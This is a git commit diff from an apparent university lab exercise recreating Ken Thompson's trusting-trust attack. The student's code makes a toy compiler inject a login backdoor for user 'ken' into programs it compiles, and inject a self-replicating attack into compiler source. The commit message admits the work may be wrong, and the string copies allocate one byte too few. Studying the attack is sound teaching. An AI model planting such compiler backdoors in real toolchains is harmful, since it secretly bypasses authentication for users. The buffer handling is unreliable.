0da289b29d7ccd7a3a16666101cf2f8707c6faa3
Peter McEvoy <mcevoypeter@outlook.com>
2020-04-09 21:37:18 -0600

    [completed] 1-trusting-trust part 2
    I have the steps in the README working, but I didn't inject an fprintf
    into compile. I think this may be wrong, but I'm committing now so that
    I have a (mostly) working copy.

--- labs/1-trusting-trust/code/step2/trojan-cc1.c
+++ labs/1-trusting-trust/code/step2/trojan-cc1.c
@@ -30,9 +30,83 @@ static void compile(char *program, char *outname) {
     static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
 
     /* your code goes here */
+    char *prog = program;
+    unsigned bytes_needed = strlen(prog) + 1;
+    char *hacked_prog = calloc(bytes_needed, 1);
+    char *end = hacked_prog;
+
+    char *login_start = strstr(prog, login_sig);
+    if (login_start) {
+        // inject `\n\tlogin_attack\n`
+        char *attack_prefix = "\n\t";
+        char *attack_suffix = "\n";
+        bytes_needed += strlen(attack_prefix) + strlen(login_attack) + strlen(attack_suffix);
+        hacked_prog = realloc(hacked_prog, bytes_needed);
+        end = hacked_prog;
+
+        // copy prefix
+        char *login_end = login_start + strlen(login_sig);
+        unsigned prefix_len = login_end - prog;
+        memcpy(end, prog, prefix_len);
+        end += prefix_len;
+
+        // inject attack
+        memcpy(end, attack_prefix, strlen(attack_prefix));
+        end += strlen(attack_prefix);
+        memcpy(end, login_attack, strlen(login_attack));
+        end += strlen(login_attack);
+        memcpy(end, attack_suffix, strlen(attack_suffix));
+        end += strlen(attack_suffix);
+
+        // copy suffix
+        unsigned suffix_len = prog + strlen(prog) - login_end;
+        memcpy(end, login_end, suffix_len);
+        end += suffix_len;
+        *end = 0;
+
+        // copy hacked_prog into prog
+        prog = calloc(strlen(hacked_prog), 1);
+        strcpy(prog, hacked_prog);
+    }
+
+    char *compile_start = strstr(prog, compile_sig);
+    if (compile_start) {
+        // inject `\n\t<compile_attack>\n`
+        char *attack_prefix = "\n\t"; 
+        char *attack_suffix = "\n"; 
+        bytes_needed += strlen(attack_prefix) + strlen(compile_attack) + strlen(attack_suffix);
+        hacked_prog = realloc(hacked_prog, bytes_needed);
+        end = hacked_prog;
+
+        // copy prefix
+        char *compile_end = compile_start + strlen(compile_sig);
+        unsigned prefix_len = compile_end - prog;
+        memcpy(end, prog, prefix_len);
+        end += prefix_len;
+
+        // inject attack
+        memcpy(end, attack_prefix, strlen(attack_prefix));
+        end += strlen(attack_prefix);
+        memcpy(end, compile_attack, strlen(compile_attack));
+        end += strlen(compile_attack);
+        memcpy(end, attack_suffix, strlen(attack_suffix));
+        end += strlen(attack_suffix);
+
+        // copy suffix
+        unsigned suffix_len = prog + strlen(prog) - compile_end;
+        memcpy(end, compile_end, suffix_len);
+        end += suffix_len;
+        *end = 0;
+
+        // copy hacked_prog into prog
+        if (login_start)
+            free(prog);
+        prog = calloc(strlen(hacked_prog), 1);
+        strcpy(prog, hacked_prog);
+    }
 
 
-    fprintf(fp, "%s", program);
+    fprintf(fp, "%s", prog);
     fclose(fp);
 
     // gross, call gcc.
